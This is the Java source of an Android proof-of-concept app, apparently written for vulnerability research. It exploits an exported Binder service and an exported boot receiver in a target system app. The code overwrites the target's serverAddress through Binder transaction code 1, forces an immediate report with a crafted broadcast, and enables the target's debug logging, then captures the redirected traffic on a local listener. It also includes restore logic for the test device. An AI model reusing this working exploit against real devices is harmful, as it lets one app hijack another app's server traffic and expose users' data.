package dev.poc.syshelperprobe;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.IBinder;
import android.text.method.ScrollingMovementMethod;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * PoC 主界面，全代码构建布局，不依赖 res
 *
 * 流程
 * 1 在环回口起一个临时 HTTP 服务当「第三方服务器」
 * 2 通过 Binder 事务码 1 把目标应用的 serverAddress 改成这个地址
 * 3 给导出的 OnBootReceiver 发一条自定义 action 广播，绕开 4 分钟与 6 小时等待
 * 4 目标进程把本应发往 dm.wo.com.cn 的报文投递到本地 socket，界面与文件留证
 *
 * 还原是硬约束，不能把测试机留在劫持状态
 * 目标侧没有读回 serverAddress 的事务码，所以还原只有一条路，把内置默认值原样写回
 * 该默认值与 m.d() 的第二参数完全一致，写回后行为等同从未改过
 * 兜底四层，手动按钮、界面进后台、下次启动自愈、旧值不残留
 */
public final class mainactivity extends Activity {

    private static final int SINKPORT = 8080;
    private static final String STATEPREF = "pocstate";
    private static final String KEYHIJACK = "hijacked";

    private TextView head;
    private TextView logview;
    private EditText urlbox;
    private CheckBox keepbox;
    private Button btnstart;
    private Button btnstop;

    private final StringBuilder logbuf = new StringBuilder();
    private SimpleDateFormat fmt = new SimpleDateFormat("HH:mm:ss", Locale.US);

    private sink sinker;
    private IBinder binder;
    private boolean bound;

    private final ServiceConnection conn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            binder = service;
            bound = true;
            log("已连上 " + name.flattenToShortString());
            log("binder descriptor = " + safeinterface(service));
            // so: 上次没还原就退出的话，这次连上第一件事就是改回去
            if (ishijacked()) {
                log("检测到上次未还原，正在自动恢复默认地址");
                dorestore(true);
            }
            refreshhead();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            binder = null;
            bound = false;
            log("目标服务断开");
        }
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(buildui());
        refreshhead();
        new Thread(new Runnable() {
            @Override
            public void run() {
                unbindIfneeded();
                bindservice();
            }
        }).start();
    }

    /**
     * 界面进后台就还原，避免用户切走之后测试机一直指向环回口
     * 需要保持劫持时勾上界面里的保持项
     */
    @Override
    protected void onStop() {
        super.onStop();
        boolean keep = keepbox != null && keepbox.isChecked();
        if (keep) {
            log("保持劫持已勾选，onStop 不还原");
        } else {
            if (bound && ishijacked()) {
                log("界面进入后台，自动还原默认地址");
                dorestore(false);
            }
            if (sinker != null && sinker.isrunning()) {
                sinker.stop();
                refreshhead();
            }
        }
    }

    @Override
    protected void onDestroy() {
        if (bound && ishijacked()) {
            dorestore(false);
        }
        unbindIfneeded();
        if (sinker != null) {
            sinker.stop();
        }
        super.onDestroy();
    }

    private View buildui() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(14), dp(14), dp(14), dp(14));
        root.setBackgroundColor(0xFF101418);

        head = new TextView(this);
        head.setTextColor(Color.WHITE);
        head.setTextSize(13);
        head.setPadding(0, 0, 0, dp(8));
        root.addView(head);

        LinearLayout row0 = new LinearLayout(this);
        row0.setOrientation(LinearLayout.HORIZONTAL);
        row0.addView(button("还原默认", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dorestore(true);
            }
        }));
        row0.addView(button("还原并退出", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dorestore(true);
                finish();
            }
        }));
        root.addView(row0);

        keepbox = new CheckBox(this);
        keepbox.setText("保持劫持（切后台不自动还原，调试用）");
        keepbox.setTextColor(0xFFFFB74D);
        keepbox.setTextSize(11);
        keepbox.setChecked(false);
        root.addView(keepbox);

        root.addView(label("覆写目标 serverAddress（事务码 1）"));

        urlbox = new EditText(this);
        urlbox.setSingleLine(true);
        urlbox.setText("http://127.0.0.1:" + SINKPORT + "/register");
        urlbox.setTextColor(Color.WHITE);
        urlbox.setTextSize(12);
        root.addView(urlbox, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        LinearLayout row1 = new LinearLayout(this);
        row1.setOrientation(LinearLayout.HORIZONTAL);
        row1.addView(button("开始监听", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startsink();
            }
        }));
        btnstart = (Button) row1.getChildAt(0);
        row1.addView(button("停止监听", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (sinker != null) {
                    sinker.stop();
                }
                refreshhead();
            }
        }));
        btnstop = (Button) row1.getChildAt(1);
        root.addView(row1);

        LinearLayout row2 = new LinearLayout(this);
        row2.setOrientation(LinearLayout.HORIZONTAL);
        row2.addView(button("覆写地址", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dowrite();
            }
        }));
        row2.addView(button("触发上报", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dotrigger();
            }
        }));
        row2.addView(button("清屏", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                logbuf.setLength(0);
                logview.setText("");
            }
        }));
        root.addView(row2);

        LinearLayout row3 = new LinearLayout(this);
        row3.setOrientation(LinearLayout.HORIZONTAL);
        row3.addView(button("读日志开关", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                doreadlog();
            }
        }));
        row3.addView(button("开目标日志", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dowritelog();
            }
        }));
        root.addView(row3);

        logview = new TextView(this);
        logview.setTextColor(0xFFB9F6CA);
        logview.setTextSize(11);
        logview.setTypeface(android.graphics.Typeface.MONOSPACE);
        logview.setMovementMethod(new ScrollingMovementMethod());
        ScrollView sc = new ScrollView(this);
        sc.setBackgroundColor(0xFF05070A);
        sc.addView(logview);
        root.addView(sc, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
        return root;
    }

    private TextView label(String s) {
        TextView t = new TextView(this);
        t.setText(s);
        t.setTextColor(0xFF90A4AE);
        t.setTextSize(11);
        t.setPadding(0, dp(10), 0, dp(4));
        return t;
    }

    private Button button(String s, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(s);
        b.setTextSize(11);
        b.setAllCaps(false);
        b.setGravity(Gravity.CENTER);
        b.setOnClickListener(l);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.setMargins(dp(2), dp(2), dp(2), dp(2));
        b.setLayoutParams(lp);
        return b;
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density + 0.5f);
    }

    private void refreshhead() {
        boolean ready = probe.serviceready(this);
        String hij = ishijacked() ? "已劫持，点还原或退出即恢复" : "未劫持，处于出厂默认";
        String s = "目标 " + probe.TARGETPKG + "\n"
                + "RegisterHelperService exported=" + ready + "  binder=" + bound + "\n"
                + "本地接收器 " + (sinker != null && sinker.isrunning()
                ? "监听中 127.0.0.1:" + sinker.getport() : "未启动") + "\n"
                + "状态 " + hij;
        head.setText(s);
        head.setTextColor(ishijacked() ? 0xFFFF8A65 : Color.WHITE);
        if (btnstart != null) {
            btnstart.setEnabled(!(sinker != null && sinker.isrunning()));
        }
        if (btnstop != null) {
            btnstop.setEnabled(sinker != null && sinker.isrunning());
        }
    }

    private SharedPreferences state() {
        return getSharedPreferences(STATEPREF, Context.MODE_PRIVATE);
    }

    /**
     * 劫持标记只存在本应用自己的 prefs，目标侧看不到
     * 作用是让下次启动知道该不该自愈
     */
    private boolean ishijacked() {
        return state().getBoolean(KEYHIJACK, false);
    }

    private void sethijacked(boolean v) {
        state().edit().putBoolean(KEYHIJACK, v).commit();
        refreshhead();
    }

    private void bindservice() {
        try {
            Intent i = probe.buildintent();
            boolean ok = bindService(i, conn, Context.BIND_AUTO_CREATE);
            log("bindService 返回 " + ok);
        } catch (Exception e) {
            log("bindService 异常: " + e);
        }
    }

    private void unbindIfneeded() {
        if (!bound) {
            return;
        }
        try {
            unbindService(conn);
        } catch (Exception ignored) {
        }
        bound = false;
        binder = null;
    }

    private void startsink() {
        if (sinker != null && sinker.isrunning()) {
            return;
        }
        File dir = new File(getExternalFilesDir(null), "capture");
        if (!dir.exists() && !dir.mkdirs()) {
            log("无法创建落盘目录 " + dir);
        }
        sinker = new sink(SINKPORT, new sink.listener() {
            @Override
            public void onevent(String line) {
                log(line);
            }
        });
        sinker.setdir(dir);
        sinker.start();
        log("捕获文件 " + new File(dir, "capture.log"));
        refreshhead();
    }

    private void dowrite() {
        String url = urlbox.getText().toString().trim();
        if (url.isEmpty()) {
            toast("地址为空");
            return;
        }
        if (binder == null) {
            toast("未绑定目标服务");
            return;
        }
        try {
            probe.setaddress(binder, url);
            sethijacked(true);
            log("事务码 1 已投递, serverAddress -> " + url);
            log("退出或点「还原默认」即可恢复出厂地址");
        } catch (Exception e) {
            log("写地址失败: " + e);
        }
    }

    /**
     * 还原
     * verbose 为真时在界面打印细节，onStop 那种后台路径静默执行
     */
    private void dorestore(boolean verbose) {
        if (binder == null) {
            if (verbose) {
                toast("未绑定目标服务，无法还原");
                log("还原失败，未连上目标服务");
            }
            return;
        }
        try {
            probe.setaddress(binder, probe.DEFAULTURL);
            sethijacked(false);
            log("已还原 serverAddress -> " + probe.DEFAULTURL);
            log("目标侧下次上报走联通 DM 默认地址，行为与未安装本 PoC 时一致");
        } catch (Exception e) {
            log("还原失败: " + e);
            if (verbose) {
                toast("还原失败 " + e.getMessage());
            }
        }
    }

    private void dotrigger() {
        try {
            probe.sendtrigger(this);
            log("已向 " + probe.RECEIVERCLS + " 投递自定义 action 广播");
            log("目标侧将走 else 分支执行 b.a(ctx,\"B\")，等价于一次立即上报");
        } catch (Exception e) {
            log("发广播失败: " + e);
        }
    }

    private void doreadlog() {
        if (binder == null) {
            toast("未绑定目标服务");
            return;
        }
        try {
            log("事务码 5 读回 preference_enable_log = " + probe.getlog(binder));
        } catch (Exception e) {
            log("读失败: " + e);
        }
    }

    private void dowritelog() {
        if (binder == null) {
            toast("未绑定目标服务");
            return;
        }
        try {
            probe.setlog(binder, true);
            log("事务码 4 已投递, 目标调试日志打开");
            log("现在可以 adb logcat -s RegisterThread 看旁证");
        } catch (Exception e) {
            log("写失败: " + e);
        }
    }

    private void log(final String s) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                logbuf.append('[').append(fmt.format(new Date())).append("] ")
                        .append(s).append('\n');
                if (logview != null) {
                    logview.setText(logbuf.toString());
                }
            }
        });
    }

    private void toast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }

    private static String safeinterface(IBinder b) {
        try {
            return b.getInterfaceDescriptor();
        } catch (Exception e) {
            return "?" + e;
        }
    }
}
